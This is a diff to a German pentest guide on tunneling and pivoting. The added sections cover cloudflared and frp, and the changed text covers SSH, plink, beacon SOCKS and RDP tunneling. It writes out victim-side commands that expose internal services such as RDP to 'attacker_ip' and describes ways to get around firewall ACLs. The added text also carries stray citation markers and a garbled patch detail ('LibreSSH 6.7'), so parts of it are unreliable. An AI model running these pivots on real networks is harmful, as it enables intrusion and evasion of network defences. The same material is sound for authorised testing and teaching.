@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Öffnen Sie neuen Port auf SSH-Server --> Anderer Port
+Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -87,10 +87,14 @@ Setzen Sie eine neue Route auf der Client-Seite
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Sicherheit – Terrapin-Angriff (CVE-2023-48795)**
+> Der Terrapin-Downgrade-Angriff von 2023 kann es einem Man-in-the-Middle ermöglichen, mit dem frühen SSH-Handshake zu manipulieren und Daten in **jeden weitergeleiteten Kanal** ( `-L`, `-R`, `-D` ) einzufügen. Stellen Sie sicher, dass sowohl der Client als auch der Server gepatcht sind (**OpenSSH ≥ 9.6/LibreSSH 6.7**) oder deaktivieren Sie ausdrücklich die verwundbaren Algorithmen `chacha20-poly1305@openssh.com` und `*-etm@openssh.com` in `sshd_config`/`ssh_config`, bevor Sie sich auf SSH-Tunnel verlassen. citeturn4search0
+
 ## SSHUTTLE
 
 Sie können **tunneln** über **ssh** den gesamten **Verkehr** zu einem **Subnetz** über einen Host.\
-Zum Beispiel, den gesamten Verkehr, der zu 10.10.10.0/24 geht, weiterleiten.
+Zum Beispiel, um den gesamten Verkehr, der zu 10.10.10.0/24 geht, weiterzuleiten.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS-Proxy
 
-Öffnen Sie einen Port im Teamserver, der auf allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
+Öffnen Sie einen Port im Teamserver, der an allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -152,7 +156,7 @@ rportfwd stop [bind port]
 ```
 Zu beachten:
 
-- Beacons Reverse-Port-Forward ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
+- Beacons Reverse-Port-Forwarding ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
 - Der Verkehr wird **innerhalb des C2-Verkehrs von Beacon getunnelt**, einschließlich P2P-Links.
 - **Admin-Rechte sind nicht erforderlich**, um Reverse-Port-Forwards auf hohen Ports zu erstellen.
 
@@ -322,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
+Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -360,7 +364,7 @@ Jetzt können wir über **RDP** mit dem **Opfer** über **`mstsc.exe`** **verbin
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Bestätigen Sie nun auf Ihrer Maschine (Angreifer), dass der Port 1080 lauscht:
+Bestätigen Sie jetzt auf Ihrem Gerät (Angreifer), dass der Port 1080 lauscht:
 ```
 netstat -antb | findstr 1080
 ```
@@ -392,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Jetzt, wenn Sie beispielsweise den **SSH**-Dienst auf dem Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
+Jetzt, wenn Sie beispielsweise den **SSH**-Dienst beim Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
 Sie könnten auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer hört auf Port 2222.
 
 ## YARP
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Der `cloudflared` Daemon von Cloudflare kann ausgehende Tunnel erstellen, die **lokale TCP/UDP-Dienste** exponieren, ohne dass eingehende Firewall-Regeln erforderlich sind, wobei die Edge von Cloudflare als Treffpunkt dient. Dies ist sehr nützlich, wenn die ausgehende Firewall nur HTTPS-Verkehr zulässt, aber eingehende Verbindungen blockiert sind.
+
+### Schneller Tunnel-Einzeiler
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 Pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Persistente Tunnel mit DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Starten Sie den Connector:
+```bash
+cloudflared tunnel run mytunnel
+```
+Weil der gesamte Verkehr den Host **ausgehend über 443** verlässt, sind Cloudflared-Tunnel eine einfache Möglichkeit, um Eingangs-ACLs oder NAT-Grenzen zu umgehen. Beachten Sie, dass die Binärdatei normalerweise mit erhöhten Rechten ausgeführt wird – verwenden Sie Container oder das `--user`-Flag, wenn möglich. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) ist ein aktiv gewarteter Go-Reverse-Proxy, der **TCP, UDP, HTTP/S, SOCKS und P2P NAT-Hole-Punching** unterstützt. Ab **v0.53.0 (Mai 2024)** kann es als **SSH Tunnel Gateway** fungieren, sodass ein Zielhost einen Reverse-Tunnel nur mit dem Standard-OpenSSH-Client einrichten kann – keine zusätzliche Binärdatei erforderlich.
+
+### Klassischer Reverse-TCP-Tunnel
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Verwendung des neuen SSH-Gateways (kein frpc-Binärdatei)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Der obige Befehl veröffentlicht den Port des Opfers **8080** als **attacker_ip:9000**, ohne zusätzliche Werkzeuge bereitzustellen – ideal für Living-off-the-Land-Pivoting. citeturn2search1
+
 ## Andere Werkzeuge zur Überprüfung
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
